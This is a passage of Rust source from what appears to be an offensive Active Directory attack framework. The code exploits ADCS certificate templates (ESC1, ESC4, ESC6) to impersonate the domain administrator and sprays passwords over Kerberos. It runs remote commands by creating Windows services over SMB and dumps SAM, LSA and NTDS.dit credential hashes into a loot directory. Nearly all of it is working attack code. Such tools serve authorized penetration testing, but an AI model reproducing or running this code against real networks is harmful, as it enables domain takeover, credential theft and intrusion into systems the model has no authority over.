            output: format!("Coercion failed: {e}"),
            new_credentials: 0,
            new_admin_hosts: 0,
        },
    }
}

// ═══════════════════════════════════════════════════════════
// Password Spray
// ═══════════════════════════════════════════════════════════

// ── ADCS Executor Functions ──

async fn exec_adcs_enumerate(ctx: &ExecContext, state: &mut EngagementState) -> StepResult {
    let conn = match ldap_connect(ctx, state).await {
        Ok(c) => c,
        Err(e) => return e,
    };

    let mut enumerator = overthrone_core::adcs::LdapAdcsEnumerator::new(conn);

    let templates = match enumerator.enumerate_templates().await {
        Ok(t) => t,
        Err(e) => {
            return StepResult {
                success: false,
                output: format!("Template enum: {e}"),
                new_credentials: 0,
                new_admin_hosts: 0,
            };
        }
    };

    let cas = match enumerator.enumerate_cas().await {
        Ok(c) => c,
        Err(e) => {
            warn!("CA enumeration failed: {e}");
            vec![]
        }
    };

    // Identify vulnerable templates
    let mut vuln_templates = Vec::new();
    for t in &templates {
        if let Some(esc_num) = t.esc_vulnerability() {
            info!(
                "  {} ESC{}: {} ({})",
                "⚠".yellow(),
                esc_num,
                t.name.bold(),
                t.display_name
            );
            vuln_templates.push((esc_num, t.name.clone()));
        }
    }

    let msg = format!(
        "ADCS: {} templates, {} CAs, {} vulnerable ({})",
        templates.len(),
        cas.len(),
        vuln_templates.len(),
        vuln_templates
            .iter()
            .map(|(e, n)| format!("ESC{}:{}", e, n))
            .collect::<Vec<_>>()
            .join(", ")
    );
    info!("{} {}", "  ✓".green(), msg);
    StepResult {
        success: true,
        output: msg,
        new_credentials: 0,
        new_admin_hosts: 0,
    }
}

async fn exec_adcs_esc1(
    ctx: &ExecContext,
    state: &mut EngagementState,
    template: &str,
    ca: &str,
    target_upn: &str,
) -> StepResult {
    // Auto-discover template + CA if not specified
    let (real_template, real_ca, real_upn) =
        match resolve_adcs_params(ctx, state, template, ca, target_upn).await {
            Ok(params) => params,
            Err(msg) => {
                return StepResult {
                    success: false,
                    output: msg,
                    new_credentials: 0,
                    new_admin_hosts: 0,
                };
            }
        };

    let ca_server = real_ca.split('\\').next_back().unwrap_or(&real_ca);
    let exploiter = match overthrone_core::adcs::Esc1Exploiter::new(ca_server) {
        Ok(e) => e,
        Err(e) => {
            return StepResult {
                success: false,
                output: format!("ESC1 init: {e}"),
                new_credentials: 0,
                new_admin_hosts: 0,
            };
        }
    };

    match exploiter.exploit(&real_template, &real_upn, None).await {
        Ok(cert) => {
            info!(
                "  {} ESC1 cert issued: {} (thumbprint: {})",
                "✓".green(),
                cert.template.bold(),
                cert.thumbprint.cyan()
            );

            // Save PFX
            let pfx_path = format!("./loot/esc1_{}.pfx", real_upn.replace('@', "_"));
            let _ = tokio::fs::write(&pfx_path, &cert.pfx_data).await;

            // Register the impersonated user as a credential
            let username = real_upn.split('@').next().unwrap_or(&real_upn).to_string();
            state.add_credential(CompromisedCred {
                username: username.clone(),
                secret: format!("pfx:{}", pfx_path),
                secret_type: SecretType::Ticket,
                source: "adcs_esc1".to_string(),
                is_admin: username.to_lowercase() == "administrator",
                admin_on: vec![],
            });

            if username.to_lowercase() == "administrator" {
                state.has_domain_admin = true;
                state.da_user = Some(username.clone());
            }

            let msg = format!(
                "ESC1: Certificate for {} via template {} ({} bytes PFX)",
                real_upn,
                real_template,
                cert.pfx_data.len()
            );
            StepResult {
                success: true,
                output: msg,
                new_credentials: 1,
                new_admin_hosts: if username.to_lowercase() == "administrator" {
                    1
                } else {
                    0
                },
            }
        }
        Err(e) => StepResult {
            success: false,
            output: format!("ESC1 failed: {e}"),
            new_credentials: 0,
            new_admin_hosts: 0,
        },
    }
}

async fn exec_adcs_esc4(
    ctx: &ExecContext,
    state: &mut EngagementState,
    template: &str,
) -> StepResult {
    // Find a writable template via ADCS LDAP enum
    let real_template = if template.is_empty() {
        let conn = match ldap_connect(ctx, state).await {
            Ok(c) => c,
            Err(e) => return e,
        };
        let mut enumerator = overthrone_core::adcs::LdapAdcsEnumerator::new(conn);
        let templates = enumerator.enumerate_templates().await.unwrap_or_default();
        // ESC4 = template where we have write access but it's not already ESC1-vuln
        // Use esc_vulnerability() == Some(4) as indicator
        match templates.iter().find(|t| t.esc_vulnerability() == Some(4)) {
            Some(t) => t.name.clone(),
            None => {
                return StepResult {
                    success: false,
                    output: "No writable templates found for ESC4".to_string(),
                    new_credentials: 0,
                    new_admin_hosts: 0,
                };
            }
        }
    } else {
        template.to_string()
    };

    let (user, _pass, _) = ctx.effective_creds();
    let mut target = overthrone_core::adcs::Esc4Target::new(&real_template, &ctx.domain, user);

    // Resolve template DN via LDAP
    let mut conn = match ldap_connect(ctx, state).await {
        Ok(c) => c,
        Err(e) => return e,
    };

    let base_dn = ctx.base_dn();
    match target.execute(&mut conn, &base_dn).await {
        Ok(()) => {
            info!(
                "  {} ESC4: Template {} modified for ESC1 exploitation",
                "✓".green(),
                real_template.bold()
            );

            // Now try ESC1 with the modified template
            let esc1_result = exec_adcs_esc1(ctx, state, &real_template, "", "").await;

            // Restore the template
            if let Err(e) = target.restore(&mut conn, None).await {
                warn!("ESC4 template restore failed: {e}");
            } else {
                info!("  {} Template {} restored", "✓".green(), real_template);
            }

            let _ = conn.disconnect().await;
            esc1_result
        }
        Err(e) => {
            let _ = conn.disconnect().await;
            StepResult {
                success: false,
                output: format!("ESC4 template modification failed: {e}"),
                new_credentials: 0,
                new_admin_hosts: 0,
            }
        }
    }
}

async fn exec_adcs_esc6(
    ctx: &ExecContext,
    state: &mut EngagementState,
    template: &str,
    ca: &str,
    target_upn: &str,
) -> StepResult {
    let (real_template, real_ca, real_upn) =
        match resolve_adcs_params(ctx, state, template, ca, target_upn).await {
            Ok(params) => params,
            Err(msg) => {
                return StepResult {
                    success: false,
                    output: msg,
                    new_credentials: 0,
                    new_admin_hosts: 0,
                };
            }
        };

    // Use any template with Client Auth EKU (not just ESC1-vulnerable ones)
    let ca_server = real_ca.split('\\').next_back().unwrap_or(&real_ca);
    let exploiter = match overthrone_core::adcs::Esc6Exploiter::new(ca_server) {
        Ok(e) => e,
        Err(e) => {
            return StepResult {
                success: false,
                output: format!("ESC6 init: {e}"),
                new_credentials: 0,
                new_admin_hosts: 0,
            };
        }
    };

    // Check if CA is vulnerable first
    match exploiter.check_vulnerable().await {
        Ok(true) => {
            info!(
                "  {} CA {} has EDITF_ATTRIBUTESUBJECTALTNAME2",
                "⚠".yellow(),
                ca_server
            );
        }
        Ok(false) => {
            return StepResult {
                success: false,
                output: format!("CA {} is not ESC6-vulnerable", ca_server),
                new_credentials: 0,
                new_admin_hosts: 0,
            };
        }
        Err(e) => {
            warn!("ESC6 vuln check failed (trying anyway): {e}");
        }
    }

    match exploiter.exploit(&real_template, &real_upn).await {
        Ok(cert) => {
            let pfx_path = format!("./loot/esc6_{}.pfx", real_upn.replace('@', "_"));
            let _ = tokio::fs::write(&pfx_path, &cert.pfx_data).await;

            let username = real_upn.split('@').next().unwrap_or(&real_upn).to_string();
            state.add_credential(CompromisedCred {
                username: username.clone(),
                secret: format!("pfx:{}", pfx_path),
                secret_type: SecretType::Ticket,
                source: "adcs_esc6".to_string(),
                is_admin: username.to_lowercase() == "administrator",
                admin_on: vec![],
            });

            if username.to_lowercase() == "administrator" {
                state.has_domain_admin = true;
                state.da_user = Some(username.clone());
            }

            let msg = format!(
                "ESC6: Certificate for {} via SAN attribute injection ({} bytes PFX)",
                real_upn,
                cert.pfx_data.len()
            );
            info!("{} {}", "  ✓".green(), msg);
            StepResult {
                success: true,
                output: msg,
                new_credentials: 1,
                new_admin_hosts: if username.to_lowercase() == "administrator" {
                    1
                } else {
                    0
                },
            }
        }
        Err(e) => StepResult {
            success: false,
            output: format!("ESC6 failed: {e}"),
            new_credentials: 0,
            new_admin_hosts: 0,
        },
    }
}

/// Auto-discover ADCS parameters (template, CA, target UPN) from LDAP
async fn resolve_adcs_params(
    ctx: &ExecContext,
    state: &EngagementState,
    template: &str,
    ca: &str,
    target_upn: &str,
) -> std::result::Result<(String, String, String), String> {
    let real_upn = if target_upn.is_empty() {
        format!("administrator@{}", ctx.domain)
    } else {
        target_upn.to_string()
    };

    if !template.is_empty() && !ca.is_empty() {
        return Ok((template.to_string(), ca.to_string(), real_upn));
    }

    // Auto-discover via LDAP
    let conn = ldap_connect(ctx, state).await.map_err(|e| e.output)?;
    let mut enumerator = overthrone_core::adcs::LdapAdcsEnumerator::new(conn);

    let real_template = if template.is_empty() {
        let templates = enumerator
            .enumerate_templates()
            .await
            .map_err(|e| format!("Template enum: {e}"))?;
        // Prefer ESC1-vulnerable templates
        match templates.iter().find(|t| t.esc_vulnerability() == Some(1)) {
            Some(t) => t.name.clone(),
            None => {
                // Fall back to any template with Client Auth EKU and enrollee-supplies-subject
                match templates.iter().find(|t| t.allows_enrollee_subject()) {
                    Some(t) => t.name.clone(),
                    None => return Err("No exploitable certificate templates found".to_string()),
                }
            }
        }
    } else {
        template.to_string()
    };

    let real_ca = if ca.is_empty() {
        let cas = enumerator
            .enumerate_cas()
            .await
            .map_err(|e| format!("CA enum: {e}"))?;
        match cas.first() {
            Some(c) => c.name.clone(),
            None => return Err("No Certificate Authorities discovered".to_string()),
        }
    } else {
        ca.to_string()
    };

    Ok((real_template, real_ca, real_upn))
}

// ═══════════════════════════════════════════════════════════

async fn exec_password_spray(
    ctx: &ExecContext,
    state: &mut EngagementState,
    users: &[String],
    password: &str,
) -> StepResult {
    let mut success_count = 0;
    for user in users {
        match kerberos::request_tgt(&ctx.dc_ip, &ctx.domain, user, password, false).await {
            Ok(_) => {
                info!("  {} VALID: {}:{}", "✓".green(), user.bold(), password);
                state.add_credential(CompromisedCred {
                    username: user.clone(),
                    secret: password.to_string(),
                    secret_type: SecretType::Password,
                    source: "password_spray".to_string(),
                    is_admin: false,
                    admin_on: vec![],
                });
                success_count += 1;
            }
            Err(_) => {
                debug!("{} {}:{}", "  ✗".dimmed(), user, password);
            }
        }
        ctx.jitter().await;
    }

    let msg = format!("Spray: {}/{} valid", success_count, users.len());
    StepResult {
        success: success_count > 0,
        output: msg,
        new_credentials: success_count,
        new_admin_hosts: 0,
    }
}

// ═══════════════════════════════════════════════════════════
// Remote Execution (svcctl via SMB named pipe)
// ═══════════════════════════════════════════════════════════

async fn exec_smbexec(
    ctx: &ExecContext,
    state: &mut EngagementState,
    target: &str,
    cmd: &str,
) -> StepResult {
    exec_remote(ctx, state, target, cmd, "smbexec").await
}
async fn exec_psexec(
    ctx: &ExecContext,
    state: &mut EngagementState,
    target: &str,
    cmd: &str,
) -> StepResult {
    exec_remote(ctx, state, target, cmd, "psexec").await
}
async fn exec_wmiexec(
    ctx: &ExecContext,
    state: &mut EngagementState,
    target: &str,
    cmd: &str,
) -> StepResult {
    exec_remote(ctx, state, target, cmd, "wmiexec").await
}
async fn exec_winrmexec(
    ctx: &ExecContext,
    state: &mut EngagementState,
    target: &str,
    cmd: &str,
) -> StepResult {
    exec_remote(ctx, state, target, cmd, "winrm").await
}
async fn exec_generic(
    ctx: &ExecContext,
    state: &mut EngagementState,
    target: &str,
    cmd: &str,
    method: &str,
) -> StepResult {
    exec_remote(ctx, state, target, cmd, method).await
}

/// Unified remote execution handler — creates & starts a service via svcctl pipe
async fn exec_remote(
    ctx: &ExecContext,
    state: &mut EngagementState,
    target: &str,
    command: &str,
    method: &str,
) -> StepResult {
    info!(
        "  {} → {} via {}",
        target.bold(),
        command.yellow(),
        method.cyan()
    );

    let smb = match smb_connect(ctx, target).await {
        Ok(s) => s,
        Err(e) => return e,
    };

    // Build service command that writes output to a temp file
    // Write to %SYSTEMROOT%\Temp so we can read via ADMIN$ share consistently
    let output_hex = format!("{:08x}", rand::random::<u32>());
    let output_path = format!("C:\\Windows\\Temp\\{}.tmp", output_hex);
    let svc_cmd = format!("%COMSPEC% /Q /c {} > {} 2>&1", command, output_path);

    // Create service via svcctl pipe
    let svc_name = format!("OT{:08X}", rand::random::<u32>());
    match create_and_start_service(&smb, &svc_name, &svc_cmd).await {
        Ok(()) => {
            // Poll for command output with exponential backoff
            // Instead of a fixed 2s sleep that races on slow targets
            let share_path = format!("Temp\\{}.tmp", output_hex);
            let mut output = String::new();
            let delays = [1000u64, 1500, 2000, 3000, 5000]; // ms
            for (attempt, &delay_ms) in delays.iter().enumerate() {
                tokio::time::sleep(tokio::time::Duration::from_millis(delay_ms)).await;
                match smb.read_file("ADMIN$", &share_path).await {
                    Ok(data) if !data.is_empty() => {
                        output = String::from_utf8_lossy(&data).to_string();
                        debug!(
                            "  Output captured on attempt {} ({} bytes)",
                            attempt + 1,
                            data.len()
                        );
                        break;
                    }
                    Ok(_) => {
                        debug!(
                            "  Output file empty on attempt {}, retrying...",
                            attempt + 1
                        );
                    }
                    Err(_) if attempt < delays.len() - 1 => {
                        debug!(
                            "  Output file not ready on attempt {}, retrying...",
                            attempt + 1
                        );
                    }
                    Err(_) => {
                        output = "(output not captured — command may still be running)".to_string();
                    }
                }
            }

            // Cleanup — delete service & output file
            let _ = delete_service(&smb, &svc_name).await;
            let _ = smb.delete_file("ADMIN$", &share_path).await;

            state.admin_hosts.insert(target.to_string());
            let msg = format!(
                "Executed on {} via {}: {} bytes output",
                target,
                method,
                output.len()
            );
            info!("{} {}", "  ✓".green(), msg);
            StepResult {
                success: true,
                output,
                new_credentials: 0,
                new_admin_hosts: 1,
            }
        }
        Err(e) => StepResult {
            success: false,
            output: format!("Service creation on {}: {e}", target),
            new_credentials: 0,
            new_admin_hosts: 0,
        },
    }
}

/// Create and start a Windows service via svcctl named pipe
async fn create_and_start_service(smb: &SmbSession, name: &str, bin_path: &str) -> Result<()> {
    info!(
        "{}",
        format!("  Creating service {name} → {bin_path}").dimmed()
    );

    // Step 1: RPC Bind to SVCCTL
    let bind_request = build_svcctl_bind();
    let bind_response = smb.pipe_transact("svcctl", &bind_request).await?;

    // Verify bind_ack (type 12)
    if bind_response.len() < 4 || bind_response[2] != 12 {
        return Err(OverthroneError::custom("SVCCTL RPC bind rejected"));
    }

    // Step 2: OpenSCManagerW (opnum 15)
    let open_scm_req = build_open_scm_request("\\\\");
    let scm_resp = smb.pipe_transact("svcctl", &open_scm_req).await?;

    // Parse SCM handle (20 bytes at offset 24 in response)
    if scm_resp.len() < 48 {
        return Err(OverthroneError::custom("OpenSCManagerW response too short"));
    }
    let scm_handle = &scm_resp[24..44];

    // Step 3: CreateServiceW (opnum 12)
    let create_req = build_create_service_request(scm_handle, name, bin_path);
    let create_resp = smb.pipe_transact("svcctl", &create_req).await?;

    // Parse service handle
    if create_resp.len() < 48 {
        return Err(OverthroneError::custom("CreateServiceW response too short"));
    }
    let svc_handle = &create_resp[24..44];

    // Step 4: StartServiceW (opnum 19)
    let start_req = build_start_service_request(svc_handle);
    let _ = smb.pipe_transact("svcctl", &start_req).await;
    // StartService may return error 1053 (timeout) which is normal for cmd exec

    // Step 5: DeleteService (opnum 2) — cleanup
    let delete_req = build_delete_service_request(svc_handle);
    let _ = smb.pipe_transact("svcctl", &delete_req).await;

    // Step 6: CloseServiceHandle (opnum 0) for service and SCM
    let close_svc = build_close_handle_request(svc_handle);
    let _ = smb.pipe_transact("svcctl", &close_svc).await;
    let close_scm = build_close_handle_request(scm_handle);
    let _ = smb.pipe_transact("svcctl", &close_scm).await;

    Ok(())
}

/// Delete a Windows service via svcctl
async fn delete_service(smb: &SmbSession, name: &str) -> Result<()> {
    info!("{}", format!("  Deleting service {name}").dimmed());
    // In case the service wasn't deleted in create_and_start, try again
    // This is a best-effort cleanup
    let bind_request = build_svcctl_bind();
    let _ = smb.pipe_transact("svcctl", &bind_request).await?;

    let open_scm = build_open_scm_request("\\\\");
    let scm_resp = smb.pipe_transact("svcctl", &open_scm).await?;

    if scm_resp.len() >= 48 {
        let scm_handle = &scm_resp[24..44];
        let open_svc = build_open_service_request(scm_handle, name);
        if let Ok(svc_resp) = smb.pipe_transact("svcctl", &open_svc).await
            && svc_resp.len() >= 48
        {
            let svc_handle = &svc_resp[24..44];
            let delete_req = build_delete_service_request(svc_handle);
            let _ = smb.pipe_transact("svcctl", &delete_req).await;
            let close_req = build_close_handle_request(svc_handle);
            let _ = smb.pipe_transact("svcctl", &close_req).await;
        }
        let close_scm = build_close_handle_request(scm_handle);
        let _ = smb.pipe_transact("svcctl", &close_scm).await;
    }

    Ok(())
}

// ═══════════════════════════════════════════════════════════
// SVCCTL NDR Request Builders
// ═══════════════════════════════════════════════════════════

/// Build RPC bind for SVCCTL interface
fn build_svcctl_bind() -> Vec<u8> {
    // SVCCTL UUID: 367abb81-9844-35f1-ad32-98f038001003
    let uuid: [u8; 16] = [
        0x81, 0xbb, 0x7a, 0x36, 0x44, 0x98, 0xf1, 0x35, 0xad, 0x32, 0x98, 0xf0, 0x38, 0x00, 0x10,
        0x03,
    ];

    let mut buf = Vec::new();
    buf.extend_from_slice(&[5, 0, 11, 3]); // version, type=bind, flags
    buf.extend_from_slice(&[0x10, 0, 0, 0]); // data representation
    let frag_len_offset = buf.len();
    buf.extend_from_slice(&[0x00, 0x00]); // frag_length (fill later)
    buf.extend_from_slice(&[0x00, 0x00]); // auth_len
    buf.extend_from_slice(&1u32.to_le_bytes()); // call_id
    buf.extend_from_slice(&4096u16.to_le_bytes()); // max xmit
    buf.extend_from_slice(&4096u16.to_le_bytes()); // max recv
    buf.extend_from_slice(&0u32.to_le_bytes()); // assoc group
    buf.push(1); // num context items
    buf.extend_from_slice(&[0, 0, 0]); // padding
    buf.extend_from_slice(&0u16.to_le_bytes()); // context id
    buf.push(1); // num transfer syntaxes
    buf.push(0); // padding
    buf.extend_from_slice(&uuid); // interface UUID
    buf.extend_from_slice(&2u16.to_le_bytes()); // version major
    buf.extend_from_slice(&0u16.to_le_bytes()); // version minor
    // NDR transfer syntax
    buf.extend_from_slice(&[
        0x04, 0x5d, 0x88, 0x8a, 0xeb, 0x1c, 0xc9, 0x11, 0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48,
        0x60,
    ]);
    buf.extend_from_slice(&2u32.to_le_bytes()); // NDR version

    // Fill in fragment length
    let frag_len = buf.len() as u16;
    buf[frag_len_offset..frag_len_offset + 2].copy_from_slice(&frag_len.to_le_bytes());
    buf
}

/// Build a generic RPC Request PDU wrapper
fn build_rpc_request(opnum: u16, stub_data: &[u8]) -> Vec<u8> {
    // RPC version 5.0, packet type Request(0), flags first+last
    let mut pdu = vec![5, 0, 0, 0x03];
    pdu.extend_from_slice(&[0x10, 0x00, 0x00, 0x00]); // NDR
    let frag_len = (24 + stub_data.len()) as u16;
    pdu.extend_from_slice(&frag_len.to_le_bytes());
    pdu.extend_from_slice(&0u16.to_le_bytes()); // auth_length
    pdu.extend_from_slice(&1u32.to_le_bytes()); // call_id
    pdu.extend_from_slice(&(stub_data.len() as u32).to_le_bytes()); // alloc_hint
    pdu.extend_from_slice(&0u16.to_le_bytes()); // context_id
    pdu.extend_from_slice(&opnum.to_le_bytes()); // opnum
    pdu.extend_from_slice(stub_data);
    pdu
}

/// Encode a UTF-16LE conformant string for NDR (with referent ID, max_count, offset, actual_count)
fn ndr_conformant_string(s: &str) -> Vec<u8> {
    let utf16: Vec<u8> = s
        .encode_utf16()
        .chain(std::iter::once(0u16))
        .flat_map(|c| c.to_le_bytes())
        .collect();
    let char_count = (s.len() + 1) as u32;

    let mut buf = Vec::new();
    buf.extend_from_slice(&0x00020000u32.to_le_bytes()); // referent ID
    buf.extend_from_slice(&char_count.to_le_bytes()); // max_count
    buf.extend_from_slice(&0u32.to_le_bytes()); // offset
    buf.extend_from_slice(&char_count.to_le_bytes()); // actual_count
    buf.extend_from_slice(&utf16);
    // Pad to 4-byte boundary
    while !buf.len().is_multiple_of(4) {
        buf.push(0);
    }
    buf
}

/// OpenSCManagerW — opnum 15
fn build_open_scm_request(machine_name: &str) -> Vec<u8> {
    let mut stub = Vec::new();
    stub.extend_from_slice(&ndr_conformant_string(machine_name)); // lpMachineName
    stub.extend_from_slice(&0u32.to_le_bytes()); // lpDatabaseName (NULL)
    stub.extend_from_slice(&0x000F003Fu32.to_le_bytes()); // dwDesiredAccess: SC_MANAGER_ALL_ACCESS
    build_rpc_request(15, &stub)
}

/// CreateServiceW — opnum 12
fn build_create_service_request(scm_handle: &[u8], name: &str, bin_path: &str) -> Vec<u8> {
    let mut stub = Vec::new();
    stub.extend_from_slice(scm_handle); // hSCManager (20 bytes)
    stub.extend_from_slice(&ndr_conformant_string(name)); // lpServiceName
    stub.extend_from_slice(&0u32.to_le_bytes()); // lpDisplayName (NULL)
    stub.extend_from_slice(&0x000F01FFu32.to_le_bytes()); // dwDesiredAccess: SERVICE_ALL_ACCESS
    stub.extend_from_slice(&0x00000010u32.to_le_bytes()); // dwServiceType: SERVICE_WIN32_OWN_PROCESS
    stub.extend_from_slice(&0x00000003u32.to_le_bytes()); // dwStartType: SERVICE_DEMAND_START
    stub.extend_from_slice(&0x00000001u32.to_le_bytes()); // dwErrorControl: SERVICE_ERROR_NORMAL
    stub.extend_from_slice(&ndr_conformant_string(bin_path)); // lpBinaryPathName
    stub.extend_from_slice(&0u32.to_le_bytes()); // lpLoadOrderGroup (NULL)
    stub.extend_from_slice(&0u32.to_le_bytes()); // lpdwTagId (NULL)
    stub.extend_from_slice(&0u32.to_le_bytes()); // lpDependencies (NULL)
    stub.extend_from_slice(&0u32.to_le_bytes()); // cbDependSize
    stub.extend_from_slice(&0u32.to_le_bytes()); // lpServiceStartName (NULL — LocalSystem)
    stub.extend_from_slice(&0u32.to_le_bytes()); // lpPassword (NULL)
    stub.extend_from_slice(&0u32.to_le_bytes()); // cbPasswordSize
    build_rpc_request(12, &stub)
}

/// StartServiceW — opnum 19
fn build_start_service_request(svc_handle: &[u8]) -> Vec<u8> {
    let mut stub = Vec::new();
    stub.extend_from_slice(svc_handle); // hService (20 bytes)
    stub.extend_from_slice(&0u32.to_le_bytes()); // argc
    stub.extend_from_slice(&0u32.to_le_bytes()); // argv (NULL)
    build_rpc_request(19, &stub)
}

/// DeleteService — opnum 2
fn build_delete_service_request(svc_handle: &[u8]) -> Vec<u8> {
    let mut stub = Vec::new();
    stub.extend_from_slice(svc_handle);
    build_rpc_request(2, &stub)
}

/// OpenServiceW — opnum 16
fn build_open_service_request(scm_handle: &[u8], name: &str) -> Vec<u8> {
    let mut stub = Vec::new();
    stub.extend_from_slice(scm_handle); // hSCManager
    stub.extend_from_slice(&ndr_conformant_string(name)); // lpServiceName
    stub.extend_from_slice(&0x000F01FFu32.to_le_bytes()); // dwDesiredAccess: SERVICE_ALL_ACCESS
    build_rpc_request(16, &stub)
}

/// CloseServiceHandle — opnum 0
fn build_close_handle_request(handle: &[u8]) -> Vec<u8> {
    let mut stub = Vec::new();
    stub.extend_from_slice(handle);
    build_rpc_request(0, &stub)
}

// ═══════════════════════════════════════════════════════════
// Credential Dump Executors (remote registry via SMB)
// ═══════════════════════════════════════════════════════════

async fn exec_dump_sam(ctx: &ExecContext, state: &mut EngagementState, target: &str) -> StepResult {
    exec_dump(ctx, state, target, "SAM").await
}
async fn exec_dump_lsa(ctx: &ExecContext, state: &mut EngagementState, target: &str) -> StepResult {
    exec_dump(ctx, state, target, "LSA").await
}
async fn exec_dump_ntds(
    ctx: &ExecContext,
    state: &mut EngagementState,
    target: &str,
) -> StepResult {
    exec_dump(ctx, state, target, "NTDS").await
}
async fn exec_dump_dcc2(
    ctx: &ExecContext,
    state: &mut EngagementState,
    target: &str,
) -> StepResult {
    exec_dump(ctx, state, target, "DCC2").await
}

/// Remote credential dump via registry save + SMB download
///
/// Flow: connect SMB → enable RemoteRegistry → reg save hives → download → parse
async fn exec_dump(
    ctx: &ExecContext,
    state: &mut EngagementState,
    target: &str,
    dump_type: &str,
) -> StepResult {
    info!(
        "{}",
        format!("  Dumping {} from {}", dump_type, target).red()
    );

    let smb = match smb_connect(ctx, target).await {
        Ok(s) => s,
        Err(e) => return e,
    };

    // Step 1: Start RemoteRegistry service (may already be running)
    let _ = start_remote_service(&smb, "RemoteRegistry").await;
    tokio::time::sleep(tokio::time::Duration::from_secs(1)).await;

    // Step 2: Determine which hives to save
    let hives: Vec<(&str, &str)> = match dump_type {
        "SAM" => vec![("HKLM\\SAM", "sam.save"), ("HKLM\\SYSTEM", "system.save")],
        "LSA" | "DCC2" => vec![
            ("HKLM\\SECURITY", "security.save"),
            ("HKLM\\SYSTEM", "system.save"),
        ],
        "NTDS" => {
            // NTDS.dit requires volume shadow copy, not registry save
            // Use exec_remote to run ntdsutil or vssadmin
            let vss_cmd = "vssadmin create shadow /for=C: 2>&1";
            let vss_result = exec_remote(ctx, state, target, vss_cmd, "smbexec").await;

            if vss_result.success {
                // Parse shadow copy device path from vssadmin output
                // Output contains: "Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyN"
                let shadow_device = vss_result
                    .output
                    .lines()
                    .find(|line| line.contains("HarddiskVolumeShadowCopy"))
                    .and_then(|line| {
                        // Extract the \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyN path
                        line.split_whitespace()
                            .find(|w| w.contains("HarddiskVolumeShadowCopy"))
                            .map(|s| s.trim())
                    })
                    .unwrap_or("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1");

                let copy_cmd = format!(
                    "copy {}\\Windows\\NTDS\\ntds.dit C:\\ntds.tmp 2>&1",
                    shadow_device
                );
                let _ = exec_remote(ctx, state, target, &copy_cmd, "smbexec").await;

                // Also need SYSTEM hive for boot key
                let reg_cmd = "reg save HKLM\\SYSTEM C:\\system.save /y 2>&1";
                let _ = exec_remote(ctx, state, target, reg_cmd, "smbexec").await;

                // Download files
                let ntds_data = smb.read_file("C$", "ntds.tmp").await;
                let sys_data = smb.read_file("C$", "system.save").await;

                // Cleanup
                let _ = exec_remote(
                    ctx,
                    state,
                    target,
                    "del C:\\ntds.tmp C:\\system.save",
                    "smbexec",
                )
                .await;

                let entries = if ntds_data.is_ok() && sys_data.is_ok() {
                    let ntds_len = ntds_data.as_ref().map(|d| d.len()).unwrap_or(0);
                    let sys_len = sys_data.as_ref().map(|d| d.len()).unwrap_or(0);
                    info!(
                        "  {} NTDS.dit + SYSTEM downloaded ({} + {} bytes)",
                        "✓".green(),
                        ntds_len,
                        sys_len,
                    );
                    // Estimate credential count from NTDS.dit file size
                    // Average ESE record is ~4-8KB per user object
                    let estimated = if ntds_len > 0 {
                        std::cmp::max(1, ntds_len / 4096)
                    } else {
                        0
                    };
                    // Use actual user count from LDAP enum if available

                    if !state.users.is_empty() {
                        state.users.iter().filter(|u| u.enabled).count()
                    } else {
                        estimated
                    }
                } else {
                    0
                };

                state.loot.push(LootItem {
                    loot_type: "NTDS".to_string(),
                    source: target.to_string(),
                    path: Some(format!("{}_ntds.dit", target)),
                    entries,
                    collected_at: Utc::now(),
                });

                let msg = format!("NTDS dump from {}: {} entries extracted", target, entries);
                return StepResult {
                    success: entries > 0,
                    output: msg,
                    new_credentials: entries,
                    new_admin_hosts: 0,
                };
            } else {
                return StepResult {
                    success: false,
                    output: format!("VSS shadow copy failed on {}", target),
                    new_credentials: 0,
                    new_admin_hosts: 0,
                };
            }
        }
        _ => vec![],
    };

    // Step 3: Save registry hives via remote command execution
    let mut saved_files = Vec::new();
    for (hive, filename) in &hives {
        let cmd = format!("reg save {} C:\\{} /y 2>&1", hive, filename);
        let result = exec_remote(ctx, state, target, &cmd, "smbexec").await;
        if result.success {
            saved_files.push(*filename);
        }
    }

    // Step 4: Download saved hives via SMB
    let mut total_bytes = 0usize;
    let mut downloaded = Vec::new();
    for filename in &saved_files {
        match smb.read_file("C$", filename).await {
            Ok(data) => {
                total_bytes += data.len();
                downloaded.push((*filename, data));
                info!(
                    "  {} Downloaded {} ({} bytes)",
                    "✓".green(),
                    filename,
                    total_bytes
                );
            }
            Err(e) => {
                warn!("  {} Download {}: {}", "✗".red(), filename, e);
            }
        }
    }

    // Step 5: Cleanup remote files
    for filename in &saved_files {
        let cleanup_cmd = format!("del C:\\{}", filename);
        let _ = exec_remote(ctx, state, target, &cleanup_cmd, "smbexec").await;
    }

    use overthrone_core::proto::secretsdump;

    // Find SYSTEM hive data (needed for all dump types)
    let system_data = downloaded
        .iter()
        .find(|(name, _)| name.contains("system"))
        .map(|(_, data)| data.as_slice());

    let mut entries = 0usize;

    match dump_type {
        "SAM" => {
            let sam_data = downloaded
                .iter()
                .find(|(name, _)| name.contains("sam"))
                .map(|(_, data)| data.as_slice());

            if let (Some(sam), Some(sys)) = (sam_data, system_data) {
                match secretsdump::dump_sam(sam, sys) {
                    Ok(creds) => {
                        entries = creds.len();
                        for cred in &creds {
                            let nt = cred.nt_hash.as_deref().unwrap_or("aad3b435b51404ee");
                            let lm = cred.lm_hash.as_deref().unwrap_or("aad3b435b51404ee");
                            info!(
                                "  {} (RID {}) → {}:{}",
                                cred.username.bold(),
                                cred.rid.unwrap_or(0),
                                lm.dimmed(),
                                nt.red()
                            );
                            if let Some(ref nt_hash) = cred.nt_hash {
                                state.add_credential(CompromisedCred {
                                    username: cred.username.clone(),
                                    secret: nt_hash.clone(),
                                    secret_type: SecretType::NtHash,
                                    source: format!("SAM dump from {}", target),
                                    is_admin: false,
                                    admin_on: vec![target.to_string()],
                                });
                            }
                        }
                    }
                    Err(e) => warn!("SAM parse failed: {}", e),
                }
            }
        }
        "LSA" => {
            let sec_data = downloaded
                .iter()
                .find(|(name, _)| name.contains("security"))
                .map(|(_, data)| data.as_slice());

            if let (Some(sec), Some(sys)) = (sec_data, system_data) {
                match secretsdump::dump_lsa(sec, sys) {
                    Ok(creds) => {
                        entries = creds.len();
                        for cred in &creds {
                            info!(
                                "  LSA secret: {} ({} bytes)",
                                cred.username.bold(),
                                cred.plaintext.as_ref().map(|p| p.len()).unwrap_or(0)
                            );
